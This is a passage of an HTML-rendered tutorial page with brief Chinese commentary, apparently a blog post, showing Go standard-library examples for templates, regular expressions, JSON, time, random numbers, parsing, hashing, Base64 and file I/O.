class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;os&quot;</span>  <br>    <span class="hljs-string">&quot;text/template&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    t1 := template<span class="hljs-selector-class">.New</span>(<span class="hljs-string">&quot;t1&quot;</span>)  <br>    t1, err := t1<span class="hljs-selector-class">.Parse</span>(<span class="hljs-string">&quot;Value is &#123;&#123;.&#125;&#125;\n&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>  <br>    t1 = template<span class="hljs-selector-class">.Must</span>(t1<span class="hljs-selector-class">.Parse</span>(<span class="hljs-string">&quot;Value: &#123;&#123;.&#125;&#125;\n&quot;</span>))  <br>  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;some text&quot;</span>)  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-number">5</span>)  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-selector-attr">[]</span>string&#123;  <br>       <span class="hljs-string">&quot;Go&quot;</span>,  <br>       <span class="hljs-string">&quot;Rust&quot;</span>,  <br>       <span class="hljs-string">&quot;C++&quot;</span>,  <br>       <span class="hljs-string">&quot;C#&quot;</span>,  <br>    &#125;)  <br>  <br>    Create := <span class="hljs-built_in">func</span>(name, t string) *template<span class="hljs-selector-class">.Template</span> &#123;  <br>       return template<span class="hljs-selector-class">.Must</span>(template<span class="hljs-selector-class">.New</span>(name)<span class="hljs-selector-class">.Parse</span>(t))  <br>    &#125;  <br>  <br>    t2 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t2&quot;</span>, <span class="hljs-string">&quot;Name: &#123;&#123;.Name&#125;&#125;\n&quot;</span>)  <br>  <br>    t2<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, struct &#123;  <br>       Name string  <br>    &#125;&#123;<span class="hljs-string">&quot;Jane Doe&quot;</span>&#125;)  <br>  <br>    t2<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, map<span class="hljs-selector-attr">[string]</span>string&#123;  <br>       <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;Mickey Mouse&quot;</span>,  <br>    &#125;)  <br>  <br>    t3 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t3&quot;</span>,  <br>       <span class="hljs-string">&quot;&#123;&#123;if . -&#125;&#125; yes &#123;&#123;else -&#125;&#125; no &#123;&#123;end&#125;&#125;\n&quot;</span>)  <br>    t3<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;not empty&quot;</span>)  <br>    t3<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;&quot;</span>)  <br>  <br>    t4 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t4&quot;</span>,  <br>       <span class="hljs-string">&quot;Range: &#123;&#123;range .&#125;&#125;&#123;&#123;.&#125;&#125; &#123;&#123;end&#125;&#125;\n&quot;</span>)  <br>    t4<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>,  <br>       <span class="hljs-selector-attr">[]</span>string&#123;  <br>          <span class="hljs-string">&quot;Go&quot;</span>,  <br>          <span class="hljs-string">&quot;Rust&quot;</span>,  <br>          <span class="hljs-string">&quot;C++&quot;</span>,  <br>          <span class="hljs-string">&quot;C#&quot;</span>,  <br>       &#125;)  <br>&#125;<br></code></pre></td></tr></table></figure><p>展示动态内容或自定义输入。</p><h2 id="Regular-Expressions"><a href="#Regular-Expressions" class="headerlink" title="Regular Expressions"></a>Regular Expressions</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    &quot;fmt&quot;  <br>    &quot;regexp&quot;)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    match, _ := regexp.<span class="hljs-built_in">MatchString</span>(<span class="hljs-string">&quot;p([a-z]+)ch&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>)  <br>    fmt.<span class="hljs-built_in">Println</span>(match)  <br>  <br>    r, _ := regexp.<span class="hljs-built_in">Compile</span>(<span class="hljs-string">&quot;p([a-z]+)ch&quot;</span>)  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">MatchString</span>(<span class="hljs-string">&quot;peach&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindString</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringIndex</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringSubmatch</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringSubmatchIndex</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, -<span class="hljs-number">1</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">0</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">1</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">2</span>))  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用正则表达式创建全局变量时，最好用 MustCompile ，因为 MustCompile 会返回 panic 而不是返回错误，这使得用于全局变量更安全。</p><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;encoding/json&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br><span class="hljs-keyword">type</span> response1 <span class="hljs-keyword">struct</span> &#123;  <br>    Page   <span class="hljs-type">int</span>  <br>    Fruits []<span class="hljs-type">string</span>  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> response2 <span class="hljs-keyword">struct</span> &#123;  <br>    Page   <span class="hljs-type">int</span>      <span class="hljs-string">`json:&quot;page&quot;`</span>  <br>    Fruits []<span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;fruits&quot;`</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    slcD := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;  <br>    slcB, _ := json.Marshal(slcD)  <br>    fmt.Println(<span class="hljs-type">string</span>(slcB))  <br>  <br>    mapD := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;lettuce&quot;</span>: <span class="hljs-number">7</span>&#125;  <br>    mapB, _ := json.Marshal(mapD)  <br>    fmt.Println(<span class="hljs-type">string</span>(mapB))  <br>  <br>    res1D := &amp;response1&#123;  <br>       Page:   <span class="hljs-number">1</span>,  <br>       Fruits: []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;&#125;  <br>    res1B, _ := json.Marshal(res1D)  <br>    fmt.Println(<span class="hljs-type">string</span>(res1B))  <br>  <br>    res2D := &amp;response2&#123;  <br>       Page:   <span class="hljs-number">1</span>,  <br>       Fruits: []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;&#125;  <br>    res2B, _ := json.Marshal(res2D)  <br>    fmt.Println(<span class="hljs-type">string</span>(res2B))  <br>  <br>    byt := []<span class="hljs-type">byte</span>(<span class="hljs-string">`&#123;&quot;num&quot;:6.13,&quot;strs&quot;:[&quot;a&quot;,&quot;b&quot;]&#125;`</span>)  <br>  <br>    <span class="hljs-keyword">var</span> dat <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;  <br>  <br>    <span class="hljs-keyword">if</span> err := json.Unmarshal(byt, &amp;dat); err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt.Println(dat)  <br>  <br>    num := dat[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">float64</span>)  <br>    fmt.Println(num)  <br>  <br>    strs := dat[<span class="hljs-string">&quot;strs&quot;</span>].([]<span class="hljs-keyword">interface</span>&#123;&#125;)  <br>    str1 := strs[<span class="hljs-number">0</span>].(<span class="hljs-type">string</span>)  <br>    fmt.Println(str1)  <br>  <br>    str := <span class="hljs-string">`&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;peach&quot;]&#125;`</span>  <br>    res := response2&#123;&#125;  <br>    json.Unmarshal([]<span class="hljs-type">byte</span>(str), &amp;res)  <br>    fmt.Println(res)  <br>    fmt.Println(res.Fruits[<span class="hljs-number">0</span>])  <br>  <br>    enc := json.NewEncoder(os.Stdout)  <br>    d := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;lettuce&quot;</span>: <span class="hljs-number">7</span>&#125;  <br>    enc.Encode(d)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">p</span> := fmt<span class="hljs-selector-class">.Println</span>  <br>  <br>    now := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()  <br>    <span class="hljs-selector-tag">p</span>(now)  <br>  <br>    then := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Date</span>(  <br>       <span class="hljs-number">2009</span>, <span class="hljs-number">11</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">34</span>, <span class="hljs-number">58</span>, <span class="hljs-number">651387237</span>, <span class="hljs-selector-tag">time</span>.UTC)  <br>    <span class="hljs-selector-tag">p</span>(then)  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Year</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Month</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Day</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Hour</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Minute</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Second</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Nanosecond</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Location</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Weekday</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Before</span>(now))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.After</span>(now))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Equal</span>(now))  <br>  <br>    diff := now<span class="hljs-selector-class">.Sub</span>(then)  <br>    <span class="hljs-selector-tag">p</span>(diff)  <br>  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Hours</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Minutes</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Seconds</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Nanoseconds</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Add</span>(diff))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Add</span>(-diff))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Random-Numbers"><a href="#Random-Numbers" class="headerlink" title="Random Numbers"></a>Random Numbers</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;math/rand&quot;</span>)  <br>  <br>func main() &#123;  <br>  <br>    fmt.<span class="hljs-keyword">Print</span>(rand.<span class="hljs-keyword">Int</span>(), <span class="hljs-string">&quot;,&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Print</span>(rand.<span class="hljs-keyword">Int</span>())  <br>    fmt.<span class="hljs-keyword">Println</span>()  <br>  <br>    fmt.<span class="hljs-keyword">Println</span>(rand.Float64())  <br>  <br>    fmt.<span class="hljs-keyword">Print</span>((rand.Float64()*<span class="hljs-number">5</span>)+<span class="hljs-number">5</span>, <span class="hljs-string">&quot;,&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Print</span>((rand.Float64() * <span class="hljs-number">5</span>) + <span class="hljs-number">5</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>()  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Number-Parsing"><a href="#Number-Parsing" class="headerlink" title="Number Parsing"></a>Number Parsing</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;strconv&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    f, _ := strconv<span class="hljs-selector-class">.ParseFloat</span>(<span class="hljs-string">&quot;1.234&quot;</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(f)  <br>  <br>    <span class="hljs-selector-tag">i</span>, _ := strconv<span class="hljs-selector-class">.ParseInt</span>(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(i)  <br>  <br>    d, _ := strconv<span class="hljs-selector-class">.ParseInt</span>(<span class="hljs-string">&quot;0x1c8&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(d)  <br>  <br>    u, _ := strconv<span class="hljs-selector-class">.ParseUint</span>(<span class="hljs-string">&quot;789&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(u)  <br>  <br>    k, _ := strconv<span class="hljs-selector-class">.Atoi</span>(<span class="hljs-string">&quot;135&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Printf</span>(<span class="hljs-string">&quot;%T\n&quot;</span>, k)  <br>    fmt<span class="hljs-selector-class">.Println</span>(k)  <br>  <br>    _, e := strconv<span class="hljs-selector-class">.Atoi</span>(<span class="hljs-string">&quot;wat&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(e)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="URL-Parsing"><a href="#URL-Parsing" class="headerlink" title="URL Parsing"></a>URL Parsing</h2><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    &quot;fmt&quot;  <br>    &quot;net&quot;    &quot;net/url&quot;)  <br>  <br>func main() &#123;  <br>  <br>    <span class="hljs-attribute">s</span> := &quot;postgres://user:pass@host<span class="hljs-variable">.com</span>:5432/path?k=v#f&quot;  <br>  <br>    u, err := url<span class="hljs-variable">.Parse</span>(s)  <br>    if err != nil &#123;  <br>       panic(err)  <br>    &#125;  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Scheme</span>)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.User</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.User</span><span class="hljs-variable">.Username</span>())  <br>    p, _ := u<span class="hljs-variable">.User</span><span class="hljs-variable">.Password</span>()  <br>    fmt<span class="hljs-variable">.Println</span>(p)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Host</span>)  <br>    host, port, _ := net<span class="hljs-variable">.SplitHostPort</span>(u<span class="hljs-variable">.Host</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(host)  <br>    fmt<span class="hljs-variable">.Println</span>(port)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Path</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Fragment</span>)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.RawQuery</span>)  <br>    m, _ := url<span class="hljs-variable">.ParseQuery</span>(u<span class="hljs-variable">.RawQuery</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(m)  <br>    fmt<span class="hljs-variable">.Println</span>(m[&quot;k&quot;][0])  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SHA256-Hashes"><a href="#SHA256-Hashes" class="headerlink" title="SHA256 Hashes"></a>SHA256 Hashes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;crypto/sha256&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    s := <span class="hljs-string">&quot;sha256 this string&quot;</span>  <br>    h := sha256.New()  <br>    h.Write([]<span class="hljs-type">byte</span>(s))  <br>    bs := h.Sum(<span class="hljs-literal">nil</span>)  <br>    fmt.Printf(<span class="hljs-string">&quot;%x&quot;</span>, bs)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Base64-Encoding"><a href="#Base64-Encoding" class="headerlink" title="Base64 Encoding"></a>Base64 Encoding</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    b64 <span class="hljs-string">&quot;encoding/base64&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    data := <span class="hljs-string">&quot;abc123!?$*&amp;()&#x27;-=@~&quot;</span>  <br>  <br>    sEnc := b64<span class="hljs-selector-class">.StdEncoding</span><span class="hljs-selector-class">.EncodeToString</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(data))  <br>    fmt<span class="hljs-selector-class">.Println</span>(sEnc)  <br>  <br>    sDec, _ := b64<span class="hljs-selector-class">.StdEncoding</span><span class="hljs-selector-class">.DecodeString</span>(sEnc)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(sDec))  <br>    fmt<span class="hljs-selector-class">.Println</span>()  <br>  <br>    uEnc := b64<span class="hljs-selector-class">.URLEncoding</span><span class="hljs-selector-class">.EncodeToString</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(data))  <br>    fmt<span class="hljs-selector-class">.Println</span>(uEnc)  <br>    uDec, _ := b64<span class="hljs-selector-class">.URLEncoding</span><span class="hljs-selector-class">.DecodeString</span>(uEnc)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(uDec))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Reading-Files"><a href="#Reading-Files" class="headerlink" title="Reading Files"></a>Reading Files</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">check</span><span class="hljs-params">(e <span class="hljs-type">error</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">if</span> e != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    data, err := os.ReadFile(<span class="hljs-string">&quot;testfile&quot;</span>)  <br>    check(err)  <br>    fmt.Print(<span class="hljs-type">string</span>(data))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    d1 := <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;hello\ngo\n&quot;</span>)  <br>    err := os<span class="hljs-selector-class">.WriteFile</span>(<span 